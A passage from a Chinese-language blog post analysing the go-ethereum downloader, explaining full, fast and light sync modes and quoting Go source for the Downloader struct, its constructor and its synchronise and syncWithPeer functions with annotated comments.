进行下载，以这个区块为分界，之前的区块是没有 <code>state</code> 数据的，之后的区块会像 <code>full</code> 模式下一样在本地计算 <code>state</code>。因此在 <code>fast</code> 模式下，同步的数据除了 <code>header</code> 和 body，还有 <code>receipt</code>，以及 <code>pivot</code> 区块的 <code>state</code>。</p><p>因此 <code>fast</code> 模式忽略了大部分 <code>state</code> 数据，并且使用网络直接同步 <code>receipt</code> 数据的方式替换了 <code>full</code> 模式下的本地计算，所以比较快。</p></li><li><p>light sync：从网络中同步所有区块头，不去同步区块体，也不去同步状态数据，仅在需要相应区块和状态数据时从网络上获取</p></li></ul><blockquote><p>简单总结：</p></blockquote><p>SyncMode:</p><ul><li><code>FullSync</code>:从完整区块同步整个区块链历史</li><li><code>FastSync</code>:快速下载 Header，仅在链头处完全同步</li><li><code>LightSync</code>:仅下载 Header，然后终止</li></ul><h3 id="区块下载"><strong>区块下载</strong></h3><p>区块下载流程示意图如下所示：</p><p><img src="https://lky-img.obs.cn-east-2.myhuaweicloud.com/image-20220331155831706.png" alt="image-20220331155831706"></p><p>首先根据 Synchronise 开始区块同步，通过 findAncestor 找到指定节点的共同祖先，并在此高度进行同步，同时开启多个 goroutine 同步不同的数据：header、receipt、body，假如同步高度为 100 的区块，必须先 header 同步成功同步完成才可以进行 body 和 receipts 的同步，而每个部分的同步大致都是由 FetchParts 来完成的，里面包含了各个 Chan 的配合，也会涉及不少的回调函数</p><h3 id="源码分析"><strong>源码分析</strong></h3><h4 id="数据结构"><strong>数据结构</strong></h4><p>downloader 数据结构如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Downloader <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">  mode <span class="type">uint32</span>         <span class="comment">// Synchronisation mode defining the strategy used (per sync cycle), use d.getMode() to get the SyncMode</span></span><br><span class="line">  mux  *event.TypeMux <span class="comment">// Event multiplexer to announce sync operation events</span></span><br><span class="line"></span><br><span class="line">  checkpoint <span class="type">uint64</span>   <span class="comment">// Checkpoint block number to enforce head against (e.g. fast sync)</span></span><br><span class="line">  genesis    <span class="type">uint64</span>   <span class="comment">// Genesis block number to limit sync to (e.g. light client CHT)</span></span><br><span class="line">  queue      *queue   <span class="comment">// Scheduler(调度程序)for selecting the hashes to download</span></span><br><span class="line">  peers      *peerSet <span class="comment">// Set of active peers from which download can proceed</span></span><br><span class="line"></span><br><span class="line">  stateDB    ethdb.Database  <span class="comment">// Database to state sync into (and deduplicate via)</span></span><br><span class="line">  stateBloom *trie.SyncBloom <span class="comment">// Bloom filter for fast trie node and contract code existence checks</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Statistics  统计信息，</span></span><br><span class="line">  syncStatsChainOrigin <span class="type">uint64</span> <span class="comment">// Origin block number where syncing started at</span></span><br><span class="line">  syncStatsChainHeight <span class="type">uint64</span> <span class="comment">// Highest block number known when syncing started</span></span><br><span class="line">  syncStatsState       stateSyncStats</span><br><span class="line">  syncStatsLock        sync.RWMutex <span class="comment">// Lock protecting the sync stats fields</span></span><br><span class="line"></span><br><span class="line">  lightchain LightChain</span><br><span class="line">  blockchain BlockChain</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Callbacks</span></span><br><span class="line">  dropPeer peerDropFn <span class="comment">// Drops a peer for misbehaving</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Status</span></span><br><span class="line">  synchroniseMock <span class="function"><span class="keyword">func</span><span class="params">(id <span class="type">string</span>, hash common.Hash)</span></span> <span class="type">error</span> <span class="comment">// Replacement for synchronise during testing</span></span><br><span class="line">  synchronising   <span class="type">int32</span></span><br><span class="line">  notified        <span class="type">int32</span></span><br><span class="line">  committed       <span class="type">int32</span></span><br><span class="line">  ancientLimit    <span class="type">uint64</span> <span class="comment">// The maximum block number which can be regarded as ancient data.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Channels 这些通道很重要</span></span><br><span class="line">  headerCh      <span class="keyword">chan</span> dataPack        <span class="comment">// Channel receiving inbound block headers  header的输入通道，从网络下载的header会被送到这个通道</span></span><br><span class="line">  bodyCh        <span class="keyword">chan</span> dataPack        <span class="comment">// Channel receiving inbound block bodies   bodies的输入通道，从网络下载的bodies会被送到这个通道</span></span><br><span class="line">  receiptCh     <span class="keyword">chan</span> dataPack        <span class="comment">// Channel receiving inbound receipts       receipts的输入通道，从网络下载的receipts会被送到这个通道</span></span><br><span class="line">  bodyWakeCh    <span class="keyword">chan</span> <span class="type">bool</span>            <span class="comment">// Channel to signal the block body fetcher of new tasks   用来传输body fetcher新任务的通道</span></span><br><span class="line">  receiptWakeCh <span class="keyword">chan</span> <span class="type">bool</span>            <span class="comment">// Channel to signal the receipt fetcher of new tasks      用来传输receipt fetcher 新任务的通道</span></span><br><span class="line">  headerProcCh  <span class="keyword">chan</span> []*types.Header <span class="comment">// Channel to feed the header processor new tasks          通道为header处理者提供新的任务</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// State sync</span></span><br><span class="line">  pivotHeader *types.Header <span class="comment">// Pivot block header to dynamically push the syncing state root</span></span><br><span class="line">  pivotLock   sync.RWMutex  <span class="comment">// Lock protecting pivot header reads from updates</span></span><br><span class="line"></span><br><span class="line">  snapSync       <span class="type">bool</span>         <span class="comment">// Whether to run state sync over the snap protocol</span></span><br><span class="line">  SnapSyncer     *snap.Syncer <span class="comment">// TODO(karalabe): make private! hack for now</span></span><br><span class="line">  stateSyncStart <span class="keyword">chan</span> *stateSync    <span class="comment">//启动新的state fetcher</span></span><br><span class="line">  trackStateReq  <span class="keyword">chan</span> *stateReq</span><br><span class="line">  stateCh        <span class="keyword">chan</span> dataPack <span class="comment">// Channel receiving inbound node state data  State的输入通道，从网络下载的State会被送到这个通道</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Cancellation and termination</span></span><br><span class="line">  cancelPeer <span class="type">string</span>         <span class="comment">// Identifier of the peer currently being used as the master (cancel on drop)</span></span><br><span class="line">  cancelCh   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">// Channel to cancel mid-flight syncs</span></span><br><span class="line">  cancelLock sync.RWMutex   <span class="comment">// Lock to protect the cancel channel and peer in delivers</span></span><br><span class="line">  cancelWg   sync.WaitGroup <span class="comment">// Make sure all fetcher goroutines have exited.</span></span><br><span class="line"></span><br><span class="line">  quitCh   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125; <span class="comment">// Quit channel to signal termination</span></span><br><span class="line">  quitLock sync.Mutex    <span class="comment">// Lock to prevent double closes</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Testing hooks</span></span><br><span class="line">  syncInitHook     <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">uint64</span>, <span class="type">uint64</span>)</span></span>  <span class="comment">// Method to call upon initiating a new sync run</span></span><br><span class="line">  bodyFetchHook    <span class="function"><span class="keyword">func</span><span class="params">([]*types.Header)</span></span> <span class="comment">// Method to call upon starting a block body fetch</span></span><br><span class="line">  receiptFetchHook <span class="function"><span class="keyword">func</span><span class="params">([]*types.Header)</span></span> <span class="comment">// Method to call upon starting a receipt fetch</span></span><br><span class="line">  chainInsertHook  <span class="function"><span class="keyword">func</span><span class="params">([]*fetchResult)</span></span>  <span class="comment">// Method to call upon inserting a chain of blocks (possibly in multiple invocations)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构造方法"><strong>构造方法</strong></h4><p>New 用于初始化一个 Downloader 对象，具体代码如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// New creates a new downloader to fetch hashes and blocks from remote peers.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(checkpoint <span class="type">uint64</span>, stateDb ethdb.Database, stateBloom *trie.SyncBloom, mux *event.TypeMux, chain BlockChain, lightchain LightChain, dropPeer peerDropFn)</span></span> *Downloader &#123;</span><br><span class="line">  <span class="keyword">if</span> lightchain == <span class="literal">nil</span> &#123;</span><br><span class="line">    lightchain = chain</span><br><span class="line">  &#125;</span><br><span class="line">  dl := &amp;Downloader&#123;</span><br><span class="line">    stateDB:        stateDb,</span><br><span class="line">    stateBloom:     stateBloom,</span><br><span class="line">    mux:            mux,</span><br><span class="line">    checkpoint:     checkpoint,</span><br><span class="line">    queue:          newQueue(blockCacheMaxItems, blockCacheInitialItems),</span><br><span class="line">    peers:          newPeerSet(),</span><br><span class="line">    rttEstimate:    <span class="type">uint64</span>(rttMaxEstimate),</span><br><span class="line">    rttConfidence:  <span class="type">uint64</span>(<span class="number">1000000</span>),</span><br><span class="line">    blockchain:     chain,</span><br><span class="line">    lightchain:     lightchain,</span><br><span class="line">    dropPeer:       dropPeer,</span><br><span class="line">    headerCh:       <span class="built_in">make</span>(<span class="keyword">chan</span> dataPack, <span class="number">1</span>),</span><br><span class="line">    bodyCh:         <span class="built_in">make</span>(<span class="keyword">chan</span> dataPack, <span class="number">1</span>),</span><br><span class="line">    receiptCh:      <span class="built_in">make</span>(<span class="keyword">chan</span> dataPack, <span class="number">1</span>),</span><br><span class="line">    bodyWakeCh:     <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>, <span class="number">1</span>),</span><br><span class="line">    receiptWakeCh:  <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>, <span class="number">1</span>),</span><br><span class="line">    headerProcCh:   <span class="built_in">make</span>(<span class="keyword">chan</span> []*types.Header, <span class="number">1</span>),</span><br><span class="line">    quitCh:         <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">    stateCh:        <span class="built_in">make</span>(<span class="keyword">chan</span> dataPack),</span><br><span class="line">    SnapSyncer:     snap.NewSyncer(stateDb),</span><br><span class="line">    stateSyncStart: <span class="built_in">make</span>(<span class="keyword">chan</span> *stateSync),</span><br><span class="line">    syncStatsState: stateSyncStats&#123;</span><br><span class="line">      processed: rawdb.ReadFastTrieProgress(stateDb),</span><br><span class="line">    &#125;,</span><br><span class="line">    trackStateReq: <span class="built_in">make</span>(<span class="keyword">chan</span> *stateReq),</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">go</span> dl.qosTuner()        <span class="comment">//计算rttEstimate和rttConfidence</span></span><br><span class="line">  <span class="keyword">go</span> dl.stateFetcher()    <span class="comment">//启动stateFetcher的任务监听</span></span><br><span class="line">  <span class="keyword">return</span> dl</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步下载"><strong>同步下载</strong></h4><p>区块同步始于 Synchronise 函数，在这里会直接调用 synchronise 进行同步，如果同步过程中出现错误，则删除掉 Peer：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Synchronise tries to sync up our local block chain with a remote peer, both</span></span><br><span class="line"><span class="comment">// adding various sanity checks as well as wrapping it with various log entries.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> Synchronise(id <span class="type">string</span>, head common.Hash, td *big.Int, mode SyncMode) <span class="type">error</span> &#123;</span><br><span class="line">  err := d.synchronise(id, head, td, mode)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> err &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="literal">nil</span>, errBusy, errCanceled:</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> errors.Is(err, errInvalidChain) || errors.Is(err, errBadPeer) || errors.Is(err, errTimeout) ||</span><br><span class="line">    errors.Is(err, errStallingPeer) || errors.Is(err, errUnsyncedPeer) || errors.Is(err, errEmptyHeaderSet) ||</span><br><span class="line">    errors.Is(err, errPeersUnavailable) || errors.Is(err, errTooOld) || errors.Is(err, errInvalidAncestor) &#123;</span><br><span class="line">    log.Warn(<span class="string">&quot;Synchronisation failed, dropping peer&quot;</span>, <span class="string">&quot;peer&quot;</span>, id, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">    <span class="keyword">if</span> d.dropPeer == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="comment">// The dropPeer method is nil when `--copydb` is used for a local copy.</span></span><br><span class="line">      <span class="comment">// Timeouts can occur if e.g. compaction hits at the wrong time, and can be ignored</span></span><br><span class="line">      log.Warn(<span class="string">&quot;Downloader wants to drop peer, but peerdrop-function is not set&quot;</span>, <span class="string">&quot;peer&quot;</span>, id)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//删除操作</span></span><br><span class="line">      d.dropPeer(id)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  log.Warn(<span class="string">&quot;Synchronisation failed, retrying&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>synchronise 函数实现代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// synchronise will select the peer and use it for synchronising. If an empty string is given</span></span><br><span class="line"><span class="comment">// it will use the best peer possible and synchronize if its TD is higher than our own. If any of the</span></span><br><span class="line"><span class="comment">// checks fail an error will be returned. This method is synchronous</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> synchronise(id <span class="type">string</span>, hash common.Hash, td *big.Int, mode SyncMode) <span class="type">error</span> &#123;</span><br><span class="line">  <span class="comment">// Mock out the synchronisation if testing</span></span><br><span class="line">  <span class="keyword">if</span> d.synchroniseMock != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> d.synchroniseMock(id, hash)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Make sure only one goroutine is ever allowed past this point at once    // 只能运行一个， 检查是否正在运行</span></span><br><span class="line">  <span class="keyword">if</span> !atomic.CompareAndSwapInt32(&amp;d.synchronising, <span class="number">0</span>, <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> errBusy</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">defer</span> atomic.StoreInt32(&amp;d.synchronising, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Post a user notification of the sync (only once per session)   // 发布同步的用户通知（每个会话仅一次）</span></span><br><span class="line">  <span class="keyword">if</span> atomic.CompareAndSwapInt32(&amp;d.notified, <span class="number">0</span>, <span class="number">1</span>) &#123;</span><br><span class="line">    log.Info(<span class="string">&quot;Block synchronisation started&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If we are already full syncing, but have a fast-sync bloom filter laying</span></span><br><span class="line">  <span class="comment">// around, make sure it doesn&#x27;t use memory any more. This is a special case</span></span><br><span class="line">  <span class="comment">// when the user attempts to fast sync a new empty network.</span></span><br><span class="line">  <span class="keyword">if</span> mode == FullSync &amp;&amp; d.stateBloom != <span class="literal">nil</span> &#123;</span><br><span class="line">    d.stateBloom.Close()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If snap sync was requested, create the snap scheduler and switch to fast</span></span><br><span class="line">  <span class="comment">// sync mode. Long term we could drop fast sync or merge the two together,</span></span><br><span class="line">  <span class="comment">// but until snap becomes prevalent, we should support both. TODO(karalabe).</span></span><br><span class="line">  <span class="keyword">if</span> mode == SnapSync &#123;</span><br><span class="line">    <span class="keyword">if</span> !d.snapSync &#123;</span><br><span class="line">      log.Warn(<span class="string">&quot;Enabling snapshot sync prototype&quot;</span>)</span><br><span class="line">      d.snapSync = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    mode = FastSync</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Reset the queue, peer set and wake channels to clean any internal leftover state</span></span><br><span class="line">  d.queue.Reset(blockCacheMaxItems, blockCacheInitialItems)  <span class="comment">// 重置queue的状态</span></span><br><span class="line">  d.peers.Reset()                       <span class="comment">//  重置peer的状态</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> _, ch := <span class="keyword">range</span> []<span class="keyword">chan</span> <span class="type">bool</span>&#123;d.bodyWakeCh, d.receiptWakeCh&#125; &#123;   <span class="comment">// 清空d.bodyWakeCh, d.receiptWakeCh</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> _, ch := <span class="keyword">range</span> []<span class="keyword">chan</span> dataPack&#123;d.headerCh, d.bodyCh, d.receiptCh&#125; &#123;   <span class="comment">//清空d.headerCh, d.bodyCh, d.receiptCh</span></span><br><span class="line">    <span class="keyword">for</span> empty := <span class="literal">false</span>; !empty; &#123;</span><br><span class="line">      <span class="keyword">select</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> &lt;-ch:</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        empty = <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> empty := <span class="literal">false</span>; !empty; &#123;    <span class="comment">// 清空headerProcCh</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-d.headerProcCh:</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      empty = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Create cancel channel for aborting mid-flight and mark the master peer</span></span><br><span class="line">  d.cancelLock.Lock()</span><br><span class="line">  d.cancelCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">  d.cancelPeer = id</span><br><span class="line">  d.cancelLock.Unlock()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">defer</span> d.Cancel() <span class="comment">// No matter what, we can&#x27;t leave the cancel channel open</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Atomically set the requested sync mode</span></span><br><span class="line">  atomic.StoreUint32(&amp;d.mode, <span class="type">uint32</span>(mode))</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Retrieve the origin peer and initiate the downloading process</span></span><br><span class="line">  p := d.peers.Peer(id)</span><br><span class="line">  <span class="keyword">if</span> p == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> errUnknownPeer</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d.syncWithPeer(p, hash, td)    <span class="comment">// 基于哈希链从指定的peer和head hash开始块同步</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>syncWithPeer 函数代码如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filedir:go-ethereum-1.10.2\eth\downloader\downloader.go  L448</span></span><br><span class="line"><span class="comment">// syncWithPeer starts a block synchronization based on the hash chain from the</span></span><br><span class="line"><span class="comment">// specified peer and head hash.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> syncWithPeer(p *peerConnection, hash common.Hash, td *big.Int) (err <span class="type">error</span>) &#123;</span><br><span class="line">  d.mux.Post(StartEvent&#123;&#125;)</span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// reset on error</span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      d.mux.Post(FailedEvent&#123;err&#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      latest := d.lightchain.CurrentHeader()</span><br><span class="line">      d.mux.Post(DoneEvent&#123;latest&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;()</span><br><span class="line">  <span class="keyword">if</span> p.version &lt; <span class="number">64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%w: advertized %d &lt; required %d&quot;</span>, errTooOld, p.version, <span class="number">64</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  mode := d.getMode()</span><br><span class="line"></span><br><span class="line">  log.Debug(<span class="string">&quot;Synchronising with the network&quot;</span>, <span class="string">&quot;peer&quot;</span>, p.id, <span class="string">&quot;eth&quot;</span>, p.version, <span class="string">&quot;head&quot;</span>, hash, <span class="string">&quot;td&quot;</span>, td, <span class="string">&quot;mode&quot;</span>, mode)</span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(start time.Time)</span></span> &#123;</span><br><span class="line">    log.Debug(<span class="string">&quot;Synchronisation terminated&quot;</span>, <span class="string">&quot;elapsed&quot;</span>, common.PrettyDuration(time.Since(start)))</span><br><span class="line">  &#125;(time.Now())</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Look up the sync boundaries: the common ancestor and the target block</span></span><br><span class="line">  latest, pivot, err := d.fetchHead(p)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &amp;&amp; pivot == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="comment">// If no pivot block was returned, the head is below the min full block</span></span><br><span class="line">    <span class="comment">// threshold (i.e. new chian). In that case we won&#x27;t really fast sync</span></span><br><span class="line">    <span class="comment">// anyway, but still need a valid pivot block to avoid some code hitting</span></span><br><span class="line">    <span class="comment">// nil panics on an access.</span></span><br><span class="line">    pivot = d.blockchain.CurrentBlock().Header()</span><br><span class="line">  &#125;</span><br><span class="line">  height := latest.Number.Uint64()</span><br><span class="line"></span><br><span class="line">  origin, err := d.findAncestor(p, latest)  <span class="comment">// 通过findAncestor来获取共同祖先，以便找到一个开始同步的点</span></span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  d.syncStatsLock.Lock()</span><br><span class="line">  <span class="keyword">if</span> d.syncStatsChainHeight &lt;= origin || d.syncStatsChainOrigin &gt; 